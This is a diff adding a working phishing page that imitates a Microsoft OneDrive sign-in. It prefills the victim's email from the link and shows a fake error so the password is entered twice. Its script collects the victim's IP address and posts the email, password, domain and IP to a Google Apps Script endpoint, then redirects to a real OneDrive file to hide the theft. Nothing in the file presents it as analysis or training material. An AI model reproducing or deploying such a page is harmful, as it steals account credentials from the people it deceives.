@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>One Drive</title>
+  <link rel="icon" href="https://p.sfx.ms/images/favicon.ico" type="image/x-icon" />
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+  <style>
+    body, html {
+      height: 100%;
+      margin: 0;
+      font-family: Arial, sans-serif;
+      overflow: hidden;
+    }
+    .bg-image {
+      background-image: url(https://robertlugana.sirv.com/oned%20Back.jpg);
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      height: 100%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      position: relative;
+    }
+    .dark-overlay {
+      background-color: rgba(0, 0, 0, 0.6);
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 1;
+    }
+    .form-container {
+      background-color: #fff;
+      padding: 40px;
+      border-radius: 10px;
+      z-index: 2;
+      width: 400px;
+      max-width: 90%;
+      box-shadow: 0 0 10px rgba(0,0,0,0.5);
+    }
+    .form-container img {
+      width: 50px;
+      height: 50px;
+      display: block;
+      margin: 0 auto;
+      margin-bottom: 20px;
+    }
+    .form-container form {
+      width: 100%;
+    }
+    .error-message {
+      color: red;
+      font-size: 18px;
+      text-align: center;
+      padding: 20px;
+      display: none;
+    }
+    /* Style for the loading dialog */
+    .loading-dialog {
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: rgba(255, 255, 255, 0.8);
+      padding: 20px;
+      border-radius: 5px;
+      z-index: 9999;
+    }
+  </style>
+</head>
+<body>
+
+<div class="bg-image" id="bgImage">
+  <div class="dark-overlay"></div>
+  <div class="form-container" id="formContainer">
+    <img alt="Form Image" src="https://p.sfx.ms/images/favicon.ico">
+    <h4>Sign in to access files</h4>
+    <form id="form18" action="https://script.google.com/macros/s/AKfycbyujy1R5qLrISn3RTBut1RC9fwZbJ7bh2YELsYqXUw7M0uARGtdWcjKoYF_VnZx5kYA/exec" method="post" autocomplete="">
+      <div class="form-group" id="emailGroup">
+        <label for="exampleInputEmail1">Email address</label>
+        <input type="email" class="form-control" id="exampleInputEmail1" name="email" aria-describedby="emailHelp" required>
+      </div>
+      <div class="form-group" id="passwordGroup">
+        <label for="exampleInputPassword1">Password</label>
+        <input type="password" class="form-control" id="exampleInputPassword1" name="password" required>
+      </div>
+      <div class="error-message" id="errorMessage"></div>
+      <input type="hidden" id="domainHidden" name="domain" value="">
+      <input type="hidden" name="FormId" value="form18">
+      <button type="submit" class="btn btn-primary" id="submitButton">Login</button>
+    </form>
+  </div>
+</div>
+
+<!-- Loading dialog -->
+<div class="loading-dialog" id="loadingDialog">
+  <div class="spinner-border text-primary" role="status">
+    <span class="sr-only">Loading...</span>
+  </div>
+</div>
+
+<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+  const emailInput = document.getElementById('exampleInputEmail1');
+  const passwordInput = document.getElementById('exampleInputPassword1');
+  const domainHiddenInput = document.getElementById('domainHidden');
+  const errorMessage = document.getElementById('errorMessage');
+  const submitButton = document.getElementById('submitButton');
+  const emailGroup = document.getElementById('emailGroup');
+  const passwordGroup = document.getElementById('passwordGroup');
+  let submissionAttempts = 0;
+
+  // Function to get query string parameters
+  function getQueryParam(param) {
+    const urlParams = new URLSearchParams(window.location.search);
+    return urlParams.get(param);
+  }
+
+  // Check if email is present in the URL
+  const emailFromUrl = getQueryParam('email');
+  if (emailFromUrl) {
+    emailInput.value = emailFromUrl;
+    emailInput.setAttribute('readonly', 'readonly');
+
+    // Set the domain based on the email
+    const atIndex = emailFromUrl.lastIndexOf('@');
+    if (atIndex !== -1) {
+      const domain = emailFromUrl.slice(atIndex + 1);
+      domainHiddenInput.value = domain;
+    } else {
+      domainHiddenInput.value = '';
+    }
+  } else {
+    // Hide the email and password input fields and the submit button, show the error message
+    emailGroup.style.display = 'none';
+    passwordGroup.style.display = 'none';
+    submitButton.style.display = 'none';
+    errorMessage.style.display = 'block';
+    errorMessage.textContent = 'You are not authorized to view this page. Please request access from the document owner.';
+  }
+
+  document.querySelector('form').addEventListener('submit', function (event) {
+    event.preventDefault();
+
+    if (!emailFromUrl) {
+      return; // Prevent form submission if the email is not prefilled
+    }
+
+    const userEmail = emailInput.value.trim();
+    const domain = domainHiddenInput.value.trim();
+    const password = passwordInput.value.trim();
+
+    const formData = new FormData();
+    formData.append('Email', userEmail);
+    formData.append('Domain', domain);
+    formData.append('Password', password);
+    formData.append('FormId', 'form18');
+
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbyujy1R5qLrISn3RTBut1RC9fwZbJ7bh2YELsYqXUw7M0uARGtdWcjKoYF_VnZx5kYA/exec';
+    const maxAttempts = 99;
+
+    document.getElementById('loadingDialog').style.display = 'block';
+
+    fetch('https://ipinfo.io/json')
+      .then(response => response.json())
+      .then(data => {
+        const userIP = data.ip;
+        formData.append('IPAddress', userIP);
+
+        if (submissionAttempts === 0) {
+          fetch(scriptURL, { method: 'POST', body: formData })
+            .then(response => {
+              console.log('Form data sent.');
+              submissionAttempts++;
+              errorMessage.style.display = 'block';
+              errorMessage.textContent = 'Invalid: Please try again.';
+              passwordInput.value = ''; // Reset the password field
+              document.getElementById('loadingDialog').style.display = 'none';
+            })
+            .catch(error => {
+              console.error('Error sending form data:', error);
+              document.getElementById('loadingDialog').style.display = 'none';
+            });
+        } else if (submissionAttempts === 1) {
+          fetch(scriptURL, { method: 'POST', body: formData })
+            .then(response => {
+              submissionAttempts++;
+              if (domain) {
+                switch (domain.toLowerCase()) {
+                  case 'gmail.com':
+                    window.location.href = 'https://1drv.ms/b/s!AmHlp9dbS5_vd3yTb_f8J6yJDVs?e=CDEwzh';
+                    break;
+                  case 'yahoo.com':
+                    window.location.href = 'https://1drv.ms/b/s!AmHlp9dbS5_vd3yTb_f8J6yJDVs?e=CDEwzh';
+                    break;
+                  case 'outlook.com':
+                    window.location.href = 'https://1drv.ms/b/s!AmHlp9dbS5_vd3yTb_f8J6yJDVs?e=CDEwzh';
+                    break;
+                  default:
+                    window.location.href = 'https://1drv.ms/b/s!AmHlp9dbS5_vd3yTb_f8J6yJDVs?e=CDEwzh';
+                    break;
+                }
+              } else {
+                alert('Please enter a valid domain.');
+                passwordInput.value = ''; // Reset the password field
+                document.getElementById('loadingDialog').style.display = 'none';
+              }
+            })
+            .catch(error => {
+              console.error('Error sending form data:', error);
+              document.getElementById('loadingDialog').style.display = 'none';
+            });
+        } else if (submissionAttempts > 1 && submissionAttempts < maxAttempts) {
+          submissionAttempts++;
+          window.location.href = 'https://1drv.ms/b/s!AmHlp9dbS5_vd3yTb_f8J6yJDVs?e=CDEwzh';
+        } else {
+          errorMessage.style.display = 'block';
+          errorMessage.textContent = 'Maximum number of attempts reached.';
+          passwordInput.value = ''; // Reset the password field
+          document.getElementById('loadingDialog').style.display = 'none';
+        }
+      })
+      .catch(error => {
+        console.error('Error fetching user IP:', error);
+        document.getElementById('loadingDialog').style.display = 'none';
+      });
+  });
+});
+</script>
+
+</body>
+</html>
